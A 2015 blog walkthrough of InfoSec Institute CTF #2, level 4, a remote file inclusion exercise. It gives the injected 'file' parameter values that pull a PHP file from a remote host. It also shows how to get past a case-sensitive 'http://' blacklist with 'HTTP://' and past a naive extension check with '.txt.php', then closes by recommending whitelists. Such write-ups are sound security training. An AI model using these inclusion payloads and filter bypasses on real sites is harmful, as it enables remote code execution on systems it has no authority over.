---
layout: post
title: 'InfoSec Institute CTF #2: Level 4'
date: '2015-07-27T20:58:00.002+08:00'
author: KE
tags:
- InfoSecInstitute CTF#2
modified_time: '2015-07-27T21:02:38.310+08:00'
thumbnail: http://2.bp.blogspot.com/--hueKU_7dmQ/VbYrEZeM7JI/AAAAAAAAGUY/y9gQpYOCX80/s72-c/ex4_intro.png
blogger_id: tag:blogger.com,1999:blog-2905258938461604888.post-1159858226122210550
blogger_orig_url: http://kectf.blogspot.com/2015/07/infosec-institute-ctf-2-level-4.html
---

<div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><em style="box-sizing: border-box;">In the second edition of n00bs CTF Labs, there are 13 small challenges to test your web app hacking skills. The challenges are based on common vulnerabilities (XXS, code injection, inadequate redirect functions etc.) as well as older and less frequently seen vulnerabilities such as Data Validation; Parameter Delimiter.</em></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><em style="box-sizing: border-box;">You can access the CTF by&nbsp;<a href="http://ctf.infosecinstitute.com/ctf2/" style="background: 0px 0px; box-sizing: border-box; color: #a0aabf; cursor: pointer;">CLICKING HERE</a></em></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><em style="box-sizing: border-box;">This post includes a full walkthrough of how I solved the challenges. If you wish to avoid spoilers, you might want to attempt the challenges yourself before reading on ;).</em></div><hr style="background-color: white; box-sizing: content-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; height: 0px; line-height: 28px;" /><h5 style="-webkit-font-feature-settings: 'dlig' 1, 'liga' 1, 'lnum' 1, 'kern' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: 'Source Sans Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 1.25rem; line-height: 28px; margin-bottom: -0.56251rem; margin-top: 0px; padding-top: 0.56251rem;"><a href="https://www.blogger.com/null" id="BEGIN_8" style="background: 0px 0px; box-sizing: border-box; color: #a0aabf; cursor: pointer; text-decoration: underline;"></a>BEGIN</h5><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">We have a website that loads its content from .txt files. We are tasked to load a PHP file from&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">infosecinstitute.com</code>&nbsp;on the website.</div><table align="center" cellpadding="0" cellspacing="0" class="tr-caption-container" style="margin-left: auto; margin-right: auto; text-align: center;"><tbody><tr><td style="text-align: center;"><a href="http://2.bp.blogspot.com/--hueKU_7dmQ/VbYrEZeM7JI/AAAAAAAAGUY/y9gQpYOCX80/s1600/ex4_intro.png" imageanchor="1" style="margin-left: auto; margin-right: auto;"><img border="0" src="http://2.bp.blogspot.com/--hueKU_7dmQ/VbYrEZeM7JI/AAAAAAAAGUY/y9gQpYOCX80/s1600/ex4_intro.png" /></a></td></tr><tr><td class="tr-caption" style="text-align: center;">http://ctf.infosecinstitute.com/ctf2/exercises/ex4.php?file=file1.txt</td></tr></tbody></table><br style="box-sizing: border-box;" /><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">We can manipulate the way the website chooses which file to load for a particular page by changing the value of the&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">file</code>&nbsp;parameter. That will be our injection point for this level.</div><h5 style="-webkit-font-feature-settings: 'dlig' 1, 'liga' 1, 'lnum' 1, 'kern' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: 'Source Sans Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 1.25rem; line-height: 28px; margin-bottom: -0.56251rem; margin-top: 0px; padding-top: 0.56251rem;"><a href="https://www.blogger.com/null" id="Walkthrough_16" style="background: 0px 0px; box-sizing: border-box; color: #a0aabf; cursor: pointer; text-decoration: underline;"></a>Walkthrough</h5><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">Let’s get straight to it. We change the value of the&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">file</code>&nbsp;parameter to load a PHP file from&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">infosecinstitute.com</code>.</div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">file=http://infosecinstitute.com/file1.php</code></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-bx0Fe9t2dlU/VbYqeMZBweI/AAAAAAAAGTw/YNnZQYgTbGU/s1600/remote_url.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-bx0Fe9t2dlU/VbYqeMZBweI/AAAAAAAAGTw/YNnZQYgTbGU/s1600/remote_url.png" /></a></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">It detected that we’re trying to add a remote url. It should be detecting our&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">http://</code>&nbsp;string. Just do a quick check by removing that part from our string</div><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-sT2IVpAUUEI/VbYqeAnfeoI/AAAAAAAAGUA/RMLOPs5ESkA/s1600/invalid_file.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-sT2IVpAUUEI/VbYqeAnfeoI/AAAAAAAAGUA/RMLOPs5ESkA/s1600/invalid_file.png" /></a></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">We get a different error. So yes, the&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">http://</code>&nbsp;string is blacklisted! One of the easiest ways to bypass blacklists is case sensitivity. Most developers don’t consider case sensitivity when creating blacklists.</div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">http://</code>&nbsp;is not equal to&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">HTTP://</code>&nbsp;when directly comparing them in code.</div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">file=HTTP://infosecinstitute.com/file1.php</code></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">Now we get the invalid file error, so that should mean our&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">HTTP://</code>&nbsp;has worked! It seems the file extension is also being validated. Another quick check by replacing&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">.php</code>&nbsp;with&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">.txt</code></div><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-BmRm3nN7Khc/VbYqe7acT5I/AAAAAAAAGUI/sK5Iu91TZPk/s1600/something_else.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-BmRm3nN7Khc/VbYqe7acT5I/AAAAAAAAGUI/sK5Iu91TZPk/s1600/something_else.png" /></a></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">Indeed, we get a different error reminding us that we should be trying to load a PHP file instead of a txt file. A very common way of validating file extensions is by checking the 3 characters after the&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">.</code></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">We can bypass this by adding&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">.php</code>&nbsp;behind&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">.txt</code>. This should pass the validation if it only checks the first&nbsp;<code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">.</code>, which is actually part of our file name and not the actual file extension.</div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><code style="background-color: #f9f2f4; border-radius: 4px; box-sizing: border-box; color: #c7254e; font-family: monospace, monospace; font-size: 1em; padding: 2px 4px;">file=HTTP://infosecinstitute.com/file1.txt.php</code></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/--srL69P6LrA/VbYqfHlMyEI/AAAAAAAAGUM/8WJ7xxmszuM/s1600/success.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/--srL69P6LrA/VbYqfHlMyEI/AAAAAAAAGUM/8WJ7xxmszuM/s1600/success.png" /></a></div><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;">it works!</div><h5 style="-webkit-font-feature-settings: 'dlig' 1, 'liga' 1, 'lnum' 1, 'kern' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: 'Source Sans Pro', 'Helvetica Neue', Helvetica, Arial, sans-serif; font-size: 1.25rem; line-height: 28px; margin-bottom: -0.56251rem; margin-top: 0px; padding-top: 0.56251rem;"><a href="https://www.blogger.com/null" id="END_47" style="background: 0px 0px; box-sizing: border-box; color: #a0aabf; cursor: pointer; text-decoration: underline;"></a>END</h5><div style="-webkit-font-feature-settings: 'kern' 1, 'onum' 1, 'liga' 1; background-color: white; box-sizing: border-box; color: #373d49; font-family: Georgia, Cambria, serif; font-size: 14px; line-height: 28px; margin-bottom: 1.33999rem; padding-top: 0.66001rem;"><em style="box-sizing: border-box;">Never use blacklists to deter attackers if possible. Blacklisting requires the developer to cover all possible cases of input, and attackers only require one loop hole to be successful.</em><br /><em style="box-sizing: border-box;">Specify a set of acceptable values(whitelist) instead.</em></div>